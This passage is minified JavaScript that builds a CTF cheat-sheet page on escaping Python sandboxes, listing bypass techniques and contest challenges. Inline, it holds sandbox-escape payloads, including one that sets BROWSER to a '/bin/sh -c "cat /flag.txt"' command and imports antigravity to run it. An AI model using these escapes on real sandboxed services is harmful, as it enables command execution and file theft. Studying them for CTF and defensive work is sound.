ScavengerHunt"),Jl=u(),Pn=p("ul"),ce=p("li"),le=p("code"),Gi=r("prob.py"),Kl=u(),Hn=p("pre"),Zl=u(),Un=p("ul"),ue=p("li"),ke=p("code"),Vi=r("secret.py"),Xl=u(),Mn=p("pre"),Ql=u(),Bn=p("ul"),re=p("li"),ie=p("code"),$i=r("solve.py"),su=u(),Sn=p("pre"),nu=u(),qn=p("h3"),Yp=p("a"),Ji=r("CrewCTF 2023: starship-1"),au=u(),zn=p("ul"),_e=p("li"),de=p("code"),Ki=r("sandbox.py"),pu=u(),Wn=p("pre"),tu=u(),Yn=p("ul"),fe=p("li"),me=p("code"),Zi=r("solve.py"),ou=u(),Gn=p("pre"),eu=u(),Vn=p("h3"),Gp=p("a"),Xi=r("CrewCTF 2023: starship"),cu=u(),$n=p("ul"),be=p("li"),ye=p("code"),Qi=r("server.py"),lu=u(),Jn=p("pre"),uu=u(),Kn=p("ul"),ge=p("li"),we=p("code"),s_=r("solve.py"),ku=u(),Zn=p("pre"),ru=u(),Xn=p("h3"),Vp=p("a"),n_=r("CrewCTF 2023: setjail"),iu=u(),Qn=p("ul"),ve=p("li"),Ee=p("code"),a_=r("main.py"),_u=u(),sa=p("pre"),du=u(),na=p("ul"),he=p("li"),xe=p("code"),p_=r("solve.py"),fu=u(),aa=p("pre"),mu=u(),pa=p("h3"),$p=p("a"),t_=r("CrewCTF 2023: jailpie"),bu=u(),ta=p("ul"),Ce=p("li"),Le=p("code"),o_=r("server.py"),yu=u(),oa=p("pre"),gu=u(),ea=p("ul"),Te=p("li"),Ae=p("code"),e_=r("solve.py"),wu=u(),ca=p("pre"),vu=u(),la=p("h3"),Jp=p("a"),c_=r("SEETF 2023: Another PyJail"),Eu=u(),ua=p("ul"),Oe=p("li"),Fe=p("code"),l_=r("server.py"),hu=u(),ka=p("pre"),xu=u(),ra=p("ul"),Re=p("li"),De=p("code"),u_=r("solve.py"),Cu=u(),ia=p("pre"),Lu=u(),_a=p("h3"),Kp=p("a"),k_=r("BYUCTF 2023: Builtins 1"),Tu=u(),da=p("ul"),Ie=p("li"),je=p("code"),r_=r("b1.py"),Au=u(),fa=p("pre"),Ou=u(),ma=p("ul"),Ne=p("li"),Pe=p("code"),i_=r("solve.py"),Fu=u(),ba=p("pre"),Ru=u(),ya=p("h3"),Zp=p("a"),__=r("BYUCTF 2023: Builtins 2"),Du=u(),ga=p("ul"),He=p("li"),Ue=p("code"),d_=r("b2.py"),Iu=u(),wa=p("pre"),ju=u(),va=p("ul"),Me=p("li"),Be=p("code"),f_=r("solve.py"),Nu=u(),Ea=p("pre"),Pu=u(),ha=p("h3"),Xp=p("a"),m_=r("BYUCTF 2023: a-z0-9"),Hu=u(),xa=p("ul"),Se=p("li"),qe=p("code"),b_=r("a-z0-9.py"),Uu=u(),Ca=p("pre"),Mu=u(),La=p("ul"),ze=p("li"),We=p("code"),y_=r("solve.py"),Bu=u(),Ta=p("pre"),Su=u(),Aa=p("h3"),Qp=p("a"),g_=r("BYUCTF 2023: Leet 2"),qu=u(),Oa=p("ul"),Ye=p("li"),Ge=p("code"),w_=r("leet2.py"),zu=u(),Fa=p("pre"),Wu=u(),Ra=p("ul"),Ve=p("li"),$e=p("code"),v_=r("solve.py"),Yu=u(),Da=p("pre"),Gu=u(),Ia=p("h3"),st=p("a"),E_=r("BYUCTF 2023: abcdefghijklm"),Vu=u(),ja=p("ul"),Je=p("li"),Ke=p("code"),h_=r("abcdefghijklm.py"),$u=u(),Na=p("pre"),Ju=u(),Pa=p("ul"),Ze=p("li"),Xe=p("code"),x_=r("solve.py"),Ku=u(),Ha=p("pre"),Zu=u(),Ua=p("h3"),nt=p("a"),C_=r("BYUCTF 2023: nopqrstuvwxyz"),Xu=u(),Ma=p("ul"),Qe=p("li"),sc=p("code"),L_=r("nopqrstuvwxyz.py"),Qu=u(),Ba=p("pre"),sk=u(),Sa=p("ul"),nc=p("li"),ac=p("code"),T_=r("solve.py"),nk=u(),qa=p("pre"),ak=u(),za=p("h2"),at=p("a"),A_=r("References"),pk=u(),h=p("ul"),pc=p("li"),U=p("a"),O_=r("https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),F_=u(),tc=p("li"),M=p("a"),R_=r("https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),D_=u(),oc=p("li"),B=p("a"),I_=r("https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),this.h()},l(s){d=t(s,"BLOCKQUOTE",{});var e=o(d);w=t(e,"P",{});var Z_=o(w);A=i(Z_,"Notice: This document will be continuously updated."),Z_.forEach(n),e.forEach(n),S=k(s),_=t(s,"H2",{id:!0});var X_=o(_);m=t(X_,"A",{href:!0});var Q_=o(m);Ya=i(Q_,"Sinks"),Q_.forEach(n),X_.forEach(n),ec=k(s),$=t(s,"H3",{id:!0});var sd=o($);Ga=t(sd,"A",{href:!0});var nd=o(Ga);rk=i(nd,"retrieving builtins"),nd.forEach(n),sd.forEach(n),cc=k(s),J=t(s,"PRE",{class:!0});var X2=o(J);X2.forEach(n),lc=k(s),K=t(s,"H3",{id:!0});var ad=o(K);Va=t(ad,"A",{href:!0});var pd=o(Va);ik=i(pd,"good to know built-in functions and methods"),pd.forEach(n),ad.forEach(n),uc=k(s),Z=t(s,"PRE",{class:!0});var Q2=o(Z);Q2.forEach(n),kc=k(s),X=t(s,"H3",{id:!0});var td=o(X);$a=t(td,"A",{href:!0});var od=o($a);_k=i(od,"subclasses"),od.forEach(n),td.forEach(n),rc=k(s),Q=t(s,"PRE",{class:!0});var s1=o(Q);s1.forEach(n),ic=k(s),ss=t(s,"H3",{id:!0});var ed=o(ss);Ja=t(ed,"A",{href:!0});var cd=o(Ja);dk=i(cd,"popular modules"),cd.forEach(n),ed.forEach(n),_c=k(s),ns=t(s,"PRE",{class:!0});var n1=o(ns);n1.forEach(n),dc=k(s),as=t(s,"H2",{id:!0});var ld=o(as);Ka=t(ld,"A",{href:!0});var ud=o(Ka);fk=i(ud,"Bypasses and payloads"),ud.forEach(n),ld.forEach(n),fc=k(s),ps=t(s,"H3",{id:!0});var kd=o(ps);Za=t(kd,"A",{href:!0});var rd=o(Za);mk=i(rd,"decorators"),rd.forEach(n),kd.forEach(n),mc=k(s),ts=t(s,"PRE",{class:!0});var a1=o(ts);a1.forEach(n),bc=k(s),os=t(s,"H3",{id:!0});var id=o(os);Xa=t(id,"A",{href:!0});var _d=o(Xa);bk=i(_d,"unicode bypass"),_d.forEach(n),id.forEach(n),yc=k(s),es=t(s,"PRE",{class:!0});var p1=o(es);p1.forEach(n),gc=k(s),cs=t(s,"H3",{id:!0});var dd=o(cs);Qa=t(dd,"A",{href:!0});var fd=o(Qa);yk=i(fd,"audithook bypass"),fd.forEach(n),dd.forEach(n),wc=k(s),ls=t(s,"PRE",{class:!0});var t1=o(ls);t1.forEach(n),vc=k(s),us=t(s,"PRE",{class:!0});var o1=o(us);o1.forEach(n),Ec=k(s),ks=t(s,"H3",{id:!0});var md=o(ks);sp=t(md,"A",{href:!0});var bd=o(sp);gk=i(bd,"assigning attributes and variables"),bd.forEach(n),md.forEach(n),hc=k(s),rs=t(s,"PRE",{class:!0});var e1=o(rs);e1.forEach(n),xc=k(s),is=t(s,"PRE",{class:!0});var c1=o(is);c1.forEach(n),Cc=k(s),_s=t(s,"H3",{id:!0});var yd=o(_s);np=t(yd,"A",{href:!0});var gd=o(np);wk=i(gd,"getting attributes"),gd.forEach(n),yd.forEach(n),Lc=k(s),ds=t(s,"PRE",{class:!0});var l1=o(ds);l1.forEach(n),Tc=k(s),fs=t(s,"PRE",{class:!0});var u1=o(fs);u1.forEach(n),Ac=k(s),ms=t(s,"H3",{id:!0});var wd=o(ms);ap=t(wd,"A",{href:!0});var vd=o(ap);vk=i(vd,"running functions and methods without parenthesis"),vd.forEach(n),wd.forEach(n),Oc=k(s),bs=t(s,"PRE",{class:!0});var k1=o(bs);k1.forEach(n),Fc=k(s),ys=t(s,"PRE",{class:!0});var r1=o(ys);r1.forEach(n),Rc=k(s),gs=t(s,"H3",{id:!0});var Ed=o(gs);pp=t(Ed,"A",{href:!0});var hd=o(pp);Ek=i(hd,"deleting variables"),hd.forEach(n),Ed.forEach(n),Dc=k(s),ws=t(s,"PRE",{class:!0});var i1=o(ws);i1.forEach(n),Ic=k(s),vs=t(s,"H2",{id:!0});var xd=o(vs);tp=t(xd,"A",{href:!0});var Cd=o(tp);hk=i(Cd,"General stuff"),Cd.forEach(n),xd.forEach(n),jc=k(s),Es=t(s,"H3",{id:!0});var Ld=o(Es);op=t(Ld,"A",{href:!0});var Td=o(op);xk=i(Td,"environment variables"),Td.forEach(n),Ld.forEach(n),Nc=k(s),O=t(s,"UL",{class:!0});var tk=o(O);lt=t(tk,"LI",{});var Ad=o(lt);F=t(Ad,"A",{href:!0,rel:!0,class:!0,target:!0});var Od=o(F);Ck=i(Od,"https://www.elttam.com/blog/env/#python"),Od.forEach(n),Ad.forEach(n),Lk=k(tk),b=t(tk,"LI",{});var x=o(b);ut=t(x,"CODE",{});var Fd=o(ut);Tk=i(Fd,"PYTHONINSPECT"),Fd.forEach(n),Ak=i(x,", "),kt=t(x,"CODE",{});var Rd=o(kt);Ok=i(Rd,"PYTHONHOME"),Rd.forEach(n),Fk=i(x,", "),rt=t(x,"CODE",{});var Dd=o(rt);Rk=i(Dd,"PYTHONPATH"),Dd.forEach(n),Dk=i(x,", "),it=t(x,"CODE",{});var Id=o(it);Ik=i(Id,"PYTHONWARNINGS"),Id.forEach(n),jk=i(x,", "),_t=t(x,"CODE",{});var jd=o(_t);Nk=i(jd,"BROWSER"),jd.forEach(n),q=t(x,"UL",{class:!0});var ok=o(q);dt=t(ok,"LI",{});var Nd=o(dt);ft=t(Nd,"CODE",{});var Pd=o(ft);Pk=i(Pd,'help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")'),Pd.forEach(n),Nd.forEach(n),Hk=k(ok),hs=t(ok,"LI",{});var ek=o(hs);mt=t(ek,"CODE",{});var Hd=o(mt);Uk=i(Hd,`help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))`),Hd.forEach(n),Mk=i(ek," - ref: "),R=t(ek,"A",{href:!0,rel:!0,class:!0,target:!0});var Ud=o(R);Bk=i(Ud,"https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),Ud.forEach(n),ek.forEach(n),ok.forEach(n),x.forEach(n),tk.forEach(n),Pc=k(s),xs=t(s,"H3",{id:!0});var Md=o(xs);ep=t(Md,"A",{href:!0});var Bd=o(ep);Sk=i(Bd,"magic methods"),Bd.forEach(n),Md.forEach(n),Hc=k(s),Cs=t(s,"UL",{class:!0});var Sd=o(Cs);bt=t(Sd,"LI",{});var qd=o(bt);D=t(qd,"A",{href:!0,rel:!0,class:!0,target:!0});var zd=o(D);qk=i(zd,"https://rszalski.github.io/magicmethods/#appendix1"),zd.forEach(n),qd.forEach(n),Sd.forEach(n),Uc=k(s),Ls=t(s,"H3",{id:!0});var Wd=o(Ls);cp=t(Wd,"A",{href:!0});var Yd=o(cp);zk=i(Yd,"help"),Yd.forEach(n),Wd.forEach(n),Mc=k(s),g=t(s,"UL",{class:!0});var Y=o(g);yt=t(Y,"LI",{});var Gd=o(yt);Wk=i(Gd,"use of pager (ie. less) to escape sandbox"),Gd.forEach(n),Yk=k(Y),lp=t(Y,"LI",{});var j_=o(lp);Gk=i(j_,"list modules by entering "),gt=t(j_,"CODE",{});var Vd=o(gt);Vk=i(Vd,"modules"),Vd.forEach(n),j_.forEach(n),$k=k(Y),up=t(Y,"LI",{});var N_=o(up);Jk=i(N_,"load modules by entering module names:"),v=t(N_,"UL",{class:!0});var G=o(v);kp=t(G,"LI",{});var P_=o(kp);wt=t(P_,"CODE",{});var $d=o(wt);Kk=i($d,"__main__"),$d.forEach(n),Zk=i(P_," - should already be loaded, help page shown if so"),P_.forEach(n),Xk=k(G),rp=t(G,"LI",{});var H_=o(rp);vt=t(H_,"CODE",{});var Jd=o(vt);Qk=i(Jd,"pdb"),Jd.forEach(n),sr=i(H_," - similar to importing pdb"),H_.forEach(n),nr=k(G),ip=t(G,"LI",{});var U_=o(ip);Et=t(U_,"CODE",{});var Kd=o(Et);ar=i(Kd,"antigravity"),Kd.forEach(n),pr=i(U_," - similar to importing antigravity"),U_.forEach(n),tr=k(G),E=t(G,"LI",{});var V=o(E);ht=t(V,"CODE",{});var Zd=o(ht);or=i(Zd,"PROGRAM_NAME"),Zd.forEach(n),er=i(V," / "),xt=t(V,"CODE",{});var Xd=o(xt);cr=i(Xd,"jail"),Xd.forEach(n),lr=i(V," / "),Ct=t(V,"CODE",{});var Qd=o(Ct);ur=i(Qd,"app"),Qd.forEach(n),kr=i(V," - similar to importing and rerunning program if not wrapped in "),Lt=t(V,"CODE",{});var sf=o(Lt);rr=i(sf,'if __name__ == "__main__":'),sf.forEach(n),V.forEach(n),G.forEach(n),N_.forEach(n),ir=k(Y),_p=t(Y,"LI",{});var M_=o(_p);_r=i(M_,"see "),I=t(M_,"A",{href:!0,rel:!0,class:!0,target:!0});var nf=o(I);dr=i(nf,"SECCON Beginners CTF 2022: hitchhike4b"),nf.forEach(n),M_.forEach(n),Y.forEach(n),Bc=k(s),Ts=t(s,"PRE",{class:!0});var _1=o(Ts);_1.forEach(n),Sc=k(s),As=t(s,"H3",{id:!0});var af=o(As);dp=t(af,"A",{href:!0});var pf=o(dp);fr=i(pf,"stable payloads"),pf.forEach(n),af.forEach(n),qc=k(s),Os=t(s,"PRE",{class:!0});var d1=o(Os);d1.forEach(n),zc=k(s),Fs=t(s,"H3",{id:!0});var tf=o(Fs);fp=t(tf,"A",{href:!0});var of=o(fp);mr=i(of,"finding sinks from modules"),of.forEach(n),tf.forEach(n),Wc=k(s),j=t(s,"UL",{class:!0});var ck=o(j);mp=t(ck,"LI",{});var B_=o(mp);N=t(B_,"A",{href:!0,rel:!0,class:!0,target:!0});var ef=o(N);br=i(ef,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),ef.forEach(n),bp=t(B_,"UL",{class:!0});var cf=o(bp);Tt=t(cf,"LI",{});var lf=o(Tt);At=t(lf,"CODE",{});var uf=o(At);yr=i(uf,'__import__("ctypes")._aix.environ'),uf.forEach(n),lf.forEach(n),cf.forEach(n),B_.forEach(n),gr=k(ck),yp=t(ck,"LI",{});var S_=o(yp);P=t(S_,"A",{href:!0,rel:!0,class:!0,target:!0});var kf=o(P);wr=i(kf,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),kf.forEach(n),gp=t(S_,"UL",{class:!0});var rf=o(gp);Ot=t(rf,"LI",{});var _f=o(Ot);Ft=t(_f,"CODE",{});var df=o(Ft);vr=i(df,'__import__("_aix_support").sys'),df.forEach(n),_f.forEach(n),rf.forEach(n),S_.forEach(n),ck.forEach(n),Yc=k(s),Rs=t(s,"H3",{id:!0});var ff=o(Rs);wp=t(ff,"A",{href:!0});var mf=o(wp);Er=i(mf,"generic classes / bullet points"),mf.forEach(n),ff.forEach(n),Gc=k(s),f=t(s,"UL",{class:!0});var y=o(f);H=t(y,"LI",{});var pt=o(H);Rt=t(pt,"CODE",{});var bf=o(Rt);hr=i(bf,'f"{65:c}"'),bf.forEach(n),xr=i(pt," can format an int to char (equivalent to "),Dt=t(pt,"CODE",{});var yf=o(Dt);Cr=i(yf,'"%c" % 65 == chr(65) == "A"'),yf.forEach(n),Lr=i(pt,")"),vp=t(pt,"UL",{class:!0});var gf=o(vp);Ep=t(gf,"LI",{});var q_=o(Ep);It=t(q_,"CODE",{});var wf=o(It);Tr=i(wf,'"".encode().fromhex("41").decode()'),wf.forEach(n),Ar=i(q_," parses hex into string"),q_.forEach(n),gf.forEach(n),pt.forEach(n),Or=k(y),hp=t(y,"LI",{});var z_=o(hp);jt=t(z_,"CODE",{});var vf=o(jt);Fr=i(vf,"type"),vf.forEach(n),z=t(z_,"UL",{class:!0});var lk=o(z);Nt=t(lk,"LI",{});var Ef=o(Nt);Pt=t(Ef,"CODE",{});var hf=o(Pt);Rr=i(hf,"[].__class__.__class__"),hf.forEach(n),Ef.forEach(n),Dr=k(lk),Ht=t(lk,"LI",{});var xf=o(Ht);Ut=t(xf,"CODE",{});var Cf=o(Ut);Ir=i(Cf,'"".__class__.__class__'),Cf.forEach(n),xf.forEach(n),lk.forEach(n),z_.forEach(n),jr=k(y),xp=t(y,"LI",{});var W_=o(xp);Mt=t(W_,"CODE",{});var Lf=o(Mt);Nr=i(Lf,"object"),Lf.forEach(n),C=t(W_,"UL",{class:!0});var tt=o(C);Bt=t(tt,"LI",{});var Tf=o(Bt);St=t(Tf,"CODE",{});var Af=o(St);Pr=i(Af,"[].__class__.__mro__[1]"),Af.forEach(n),Tf.forEach(n),Hr=k(tt),qt=t(tt,"LI",{});var Of=o(qt);zt=t(Of,"CODE",{});var Ff=o(zt);Ur=i(Ff,"[].__class__.__bases__[0]"),Ff.forEach(n),Of.forEach(n),Mr=k(tt),Wt=t(tt,"LI",{});var Rf=o(Wt);Yt=t(Rf,"CODE",{});var Df=o(Yt);Br=i(Df,"[].__class__.__base__"),Df.forEach(n),Rf.forEach(n),tt.forEach(n),W_.forEach(n),Sr=k(y),Cp=t(y,"LI",{});var Y_=o(Cp);Gt=t(Y_,"CODE",{});var If=o(Gt);qr=i(If,"str"),If.forEach(n),L=t(Y_,"UL",{class:!0});var ot=o(L);Vt=t(ot,"LI",{});var jf=o(Vt);$t=t(jf,"CODE",{});var Nf=o($t);zr=i(Nf,'"".__class__'),Nf.forEach(n),jf.forEach(n),Wr=k(ot),Jt=t(ot,"LI",{});var Pf=o(Jt);Kt=t(Pf,"CODE",{});var Hf=o(Kt);Yr=i(Hf,"[].__doc__.__class__"),Hf.forEach(n),Pf.forEach(n),Gr=k(ot),Zt=t(ot,"LI",{});var Uf=o(Zt);Xt=t(Uf,"CODE",{});var Mf=o(Xt);Vr=i(Mf,"[].__class__.__module__.__class__"),Mf.forEach(n),Uf.forEach(n),ot.forEach(n),Y_.forEach(n),$r=k(y),Lp=t(y,"LI",{});var G_=o(Lp);Qt=t(G_,"CODE",{});var Bf=o(Qt);Jr=i(Bf,"tuple"),Bf.forEach(n),Tp=t(G_,"UL",{class:!0});var Sf=o(Tp);so=t(Sf,"LI",{});var qf=o(so);no=t(qf,"CODE",{});var zf=o(no);Kr=i(zf,"[].__class__.__bases__.__class__"),zf.forEach(n),qf.forEach(n),Sf.forEach(n),G_.forEach(n),Zr=k(y),Ap=t(y,"LI",{});var V_=o(Ap);ao=t(V_,"CODE",{});var Wf=o(ao);Xr=i(Wf,"dict"),Wf.forEach(n),T=t(V_,"UL",{class:!0});var et=o(T);po=t(et,"LI",{});var Yf=o(po);to=t(Yf,"CODE",{});var Gf=o(to);Qr=i(Gf,"{}.__class__"),Gf.forEach(n),Yf.forEach(n),si=k(et),oo=t(et,"LI",{});var Vf=o(oo);eo=t(Vf,"CODE",{});var $f=o(eo);ni=i($f,"obj.__dict__.__class__"),$f.forEach(n),Vf.forEach(n),ai=k(et),co=t(et,"LI",{});var Jf=o(co);lo=t(Jf,"CODE",{});var Kf=o(lo);pi=i(Kf,'"".__class__.__dict__.copy().__class__'),Kf.forEach(n),Jf.forEach(n),et.forEach(n),V_.forEach(n),ti=k(y),Ds=t(y,"LI",{});var uk=o(Ds);uo=t(uk,"CODE",{});var Zf=o(uo);oi=i(Zf,"class instances"),Zf.forEach(n),ei=i(uk,":"),W=t(uk,"UL",{class:!0});var kk=o(W);Op=t(kk,"LI",{});var $_=o(Op);ko=t($_,"CODE",{});var Xf=o(ko);ci=i(Xf,"class cobj:..."),Xf.forEach(n),Fp=t($_,"UL",{class:!0});var Qf=o(Fp);ro=t(Qf,"LI",{});var sm=o(ro);io=t(sm,"CODE",{});var nm=o(io);li=i(nm,"obj = cobj()"),nm.forEach(n),sm.forEach(n),Qf.forEach(n),$_.forEach(n),ui=k(kk),Rp=t(kk,"LI",{});var J_=o(Rp);_o=t(J_,"CODE",{});var am=o(_o);ki=i(am,'type("cobj", (object,), {})()'),am.forEach(n),Dp=t(J_,"UL",{class:!0});var pm=o(Dp);fo=t(pm,"LI",{});var tm=o(fo);mo=t(tm,"CODE",{});var om=o(mo);ri=i(om,'[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()'),om.forEach(n),tm.forEach(n),pm.forEach(n),J_.forEach(n),kk.forEach(n),uk.forEach(n),y.forEach(n),Vc=k(s),Is=t(s,"H2",{id:!0});var em=o(Is);Ip=t(em,"A",{href:!0});var cm=o(Ip);ii=i(cm,"CTF"),cm.forEach(n),em.forEach(n),$c=k(s),js=t(s,"H3",{id:!0});var lm=o(js);jp=t(lm,"A",{href:!0});var um=o(jp);_i=i(um,"SECCON CTF 13: 1linepyjail"),um.forEach(n),lm.forEach(n),Jc=k(s),Ns=t(s,"UL",{class:!0});var km=o(Ns);bo=t(km,"LI",{});var rm=o(bo);yo=t(rm,"CODE",{});var im=o(yo);di=i(im,"jail.py"),im.forEach(n),rm.forEach(n),km.forEach(n),Kc=k(s),Ps=t(s,"PRE",{class:!0});var f1=o(Ps);f1.forEach(n),Zc=k(s),Hs=t(s,"UL",{class:!0});var _m=o(Hs);go=t(_m,"LI",{});var dm=o(go);wo=t(dm,"CODE",{});var fm=o(wo);fi=i(fm,"solve.py"),fm.forEach(n),dm.forEach(n),_m.forEach(n),Xc=k(s),Us=t(s,"PRE",{class:!0});var m1=o(Us);m1.forEach(n),Qc=k(s),Ms=t(s,"H3",{id:!0});var mm=o(Ms);Np=t(mm,"A",{href:!0});var bm=o(Np);mi=i(bm,"idekCTF 2024: crator"),bm.forEach(n),mm.forEach(n),sl=k(s),Bs=t(s,"UL",{class:!0});var ym=o(Bs);vo=t(ym,"LI",{});var gm=o(vo);Eo=t(gm,"CODE",{});var wm=o(Eo);bi=i(wm,"sandbox.py"),wm.forEach(n),gm.forEach(n),ym.forEach(n),nl=k(s),Ss=t(s,"PRE",{class:!0});var b1=o(Ss);b1.forEach(n),al=k(s),qs=t(s,"UL",{class:!0});var vm=o(qs);ho=t(vm,"LI",{});var Em=o(ho);xo=t(Em,"CODE",{});var hm=o(xo);yi=i(hm,"chall.py"),hm.forEach(n),Em.forEach(n),vm.forEach(n),pl=k(s),zs=t(s,"PRE",{class:!0});var y1=o(zs);y1.forEach(n),tl=k(s),Ws=t(s,"UL",{class:!0});var xm=o(Ws);Co=t(xm,"LI",{});var Cm=o(Co);Lo=t(Cm,"CODE",{});var Lm=o(Lo);gi=i(Lm,"solve.py"),Lm.forEach(n),Cm.forEach(n),xm.forEach(n),ol=k(s),Ys=t(s,"PRE",{class:!0});var g1=o(Ys);g1.forEach(n),el=k(s),Gs=t(s,"H3",{id:!0});var Tm=o(Gs);Pp=t(Tm,"A",{href:!0});var Am=o(Pp);wi=i(Am,"UIUCTF 2024: ASTea"),Am.forEach(n),Tm.forEach(n),cl=k(s),Vs=t(s,"UL",{class:!0});var Om=o(Vs);To=t(Om,"LI",{});var Fm=o(To);Ao=t(Fm,"CODE",{});var Rm=o(Ao);vi=i(Rm,"chall.py"),Rm.forEach(n),Fm.forEach(n),Om.forEach(n),ll=k(s),$s=t(s,"PRE",{class:!0});var w1=o($s);w1.forEach(n),ul=k(s),Js=t(s,"UL",{class:!0});var Dm=o(Js);Oo=t(Dm,"LI",{});var Im=o(Oo);Fo=t(Im,"CODE",{});var jm=o(Fo);Ei=i(jm,"solve.py"),jm.forEach(n),Im.forEach(n),Dm.forEach(n),kl=k(s),Ks=t(s,"PRE",{class:!0});var v1=o(Ks);v1.forEach(n),rl=k(s),Zs=t(s,"H3",{id:!0});var Nm=o(Zs);Hp=t(Nm,"A",{href:!0});var Pm=o(Hp);hi=i(Pm,"vsCTF 2024: llama-jail-revenge"),Pm.forEach(n),Nm.forEach(n),il=k(s),Xs=t(s,"UL",{class:!0});var Hm=o(Xs);Ro=t(Hm,"LI",{});var Um=o(Ro);Do=t(Um,"CODE",{});var Mm=o(Do);xi=i(Mm,"chall.py"),Mm.forEach(n),Um.forEach(n),Hm.forEach(n),_l=k(s),Qs=t(s,"PRE",{class:!0});var E1=o(Qs);E1.forEach(n),dl=k(s),sn=t(s,"UL",{class:!0});var Bm=o(sn);Io=t(Bm,"LI",{});var Sm=o(Io);jo=t(Sm,"CODE",{});var qm=o(jo);Ci=i(qm,"exec_utils.py"),qm.forEach(n),Sm.forEach(n),Bm.forEach(n),fl=k(s),nn=t(s,"PRE",{class:!0});var h1=o(nn);h1.forEach(n),ml=k(s),an=t(s,"UL",{class:!0});var zm=o(an);No=t(zm,"LI",{});var Wm=o(No);Po=t(Wm,"CODE",{});var Ym=o(Po);Li=i(Ym,"solve.py"),Ym.forEach(n),Wm.forEach(n),zm.forEach(n),bl=k(s),pn=t(s,"PRE",{class:!0});var x1=o(pn);x1.forEach(n),yl=k(s),tn=t(s,"H3",{id:!0});var Gm=o(tn);Up=t(Gm,"A",{href:!0});var Vm=o(Up);Ti=i(Vm,"UofTCTF 2024: Zero"),Vm.forEach(n),Gm.forEach(n),gl=k(s),on=t(s,"UL",{class:!0});var $m=o(on);Ho=t($m,"LI",{});var Jm=o(Ho);Uo=t(Jm,"CODE",{});var Km=o(Uo);Ai=i(Km,"chal.py"),Km.forEach(n),Jm.forEach(n),$m.forEach(n),wl=k(s),en=t(s,"PRE",{class:!0});var C1=o(en);C1.forEach(n),vl=k(s),cn=t(s,"UL",{class:!0});var Zm=o(cn);Mo=t(Zm,"LI",{});var Xm=o(Mo);Bo=t(Xm,"CODE",{});var Qm=o(Bo);Oi=i(Qm,"solve.py"),Qm.forEach(n),Xm.forEach(n),Zm.forEach(n),El=k(s),ln=t(s,"PRE",{class:!0});var L1=o(ln);L1.forEach(n),hl=k(s),un=t(s,"H3",{id:!0});var sb=o(un);Mp=t(sb,"A",{href:!0});var nb=o(Mp);Fi=i(nb,"GlacierCTF 2023: Avatar"),nb.forEach(n),sb.forEach(n),xl=k(s),kn=t(s,"UL",{class:!0});var ab=o(kn);So=t(ab,"LI",{});var pb=o(So);qo=t(pb,"CODE",{});var tb=o(qo);Ri=i(tb,"server.py"),tb.forEach(n),pb.forEach(n),ab.forEach(n),Cl=k(s),rn=t(s,"PRE",{class:!0});var T1=o(rn);T1.forEach(n),Ll=k(s),_n=t(s,"UL",{class:!0});var ob=o(_n);zo=t(ob,"LI",{});var eb=o(zo);Wo=t(eb,"CODE",{});var cb=o(Wo);Di=i(cb,"solve.py"),cb.forEach(n),eb.forEach(n),ob.forEach(n),Tl=k(s),dn=t(s,"PRE",{class:!0});var A1=o(dn);A1.forEach(n),Al=k(s),fn=t(s,"H3",{id:!0});var lb=o(fn);Bp=t(lb,"A",{href:!0});var ub=o(Bp);Ii=i(ub,"TFC CTF 2023: My Third Calculator"),ub.forEach(n),lb.forEach(n),Ol=k(s),mn=t(s,"UL",{class:!0});var kb=o(mn);Yo=t(kb,"LI",{});var rb=o(Yo);Go=t(rb,"CODE",{});var ib=o(Go);ji=i(ib,"server.py"),ib.forEach(n),rb.forEach(n),kb.forEach(n),Fl=k(s),bn=t(s,"PRE",{class:!0});var O1=o(bn);O1.forEach(n),Rl=k(s),yn=t(s,"UL",{class:!0});var _b=o(yn);Vo=t(_b,"LI",{});var db=o(Vo);$o=t(db,"CODE",{});var fb=o($o);Ni=i(fb,"solve.py"),fb.forEach(n),db.forEach(n),_b.forEach(n),Dl=k(s),gn=t(s,"PRE",{class:!0});var F1=o(gn);F1.forEach(n),Il=k(s),wn=t(s,"H3",{id:!0});var mb=o(wn);Sp=t(mb,"A",{href:!0});var bb=o(Sp);Pi=i(bb,"Equinor CTF 2023: Dis is it!"),bb.forEach(n),mb.forEach(n),jl=k(s),vn=t(s,"UL",{class:!0});var yb=o(vn);Jo=t(yb,"LI",{});var gb=o(Jo);Ko=t(gb,"CODE",{});var wb=o(Ko);Hi=i(wb,"main.py"),wb.forEach(n),gb.forEach(n),yb.forEach(n),Nl=k(s),En=t(s,"PRE",{class:!0});var R1=o(En);R1.forEach(n),Pl=k(s),hn=t(s,"UL",{class:!0});var vb=o(hn);Zo=t(vb,"LI",{});var Eb=o(Zo);Xo=t(Eb,"CODE",{});var hb=o(Xo);Ui=i(hb,"solve.py"),hb.forEach(n),Eb.forEach(n),vb.forEach(n),Hl=k(s),xn=t(s,"PRE",{class:!0});var D1=o(xn);D1.forEach(n),Ul=k(s),Cn=t(s,"H3",{id:!0});var xb=o(Cn);qp=t(xb,"A",{href:!0});var Cb=o(qp);Mi=i(Cb,"37C3 Potluck CTF: tacocat"),Cb.forEach(n),xb.forEach(n),Ml=k(s),Ln=t(s,"UL",{class:!0});var Lb=o(Ln);Qo=t(Lb,"LI",{});var Tb=o(Qo);se=t(Tb,"CODE",{});var Ab=o(se);Bi=i(Ab,"main.py"),Ab.forEach(n),Tb.forEach(n),Lb.forEach(n),Bl=k(s),Tn=t(s,"PRE",{class:!0});var I1=o(Tn);I1.forEach(n),Sl=k(s),An=t(s,"UL",{class:!0});var Ob=o(An);ne=t(Ob,"LI",{});var Fb=o(ne);ae=t(Fb,"CODE",{});var Rb=o(ae);Si=i(Rb,"solve.py"),Rb.forEach(n),Fb.forEach(n),Ob.forEach(n),ql=k(s),On=t(s,"PRE",{class:!0});var j1=o(On);j1.forEach(n),zl=k(s),Fn=t(s,"H3",{id:!0});var 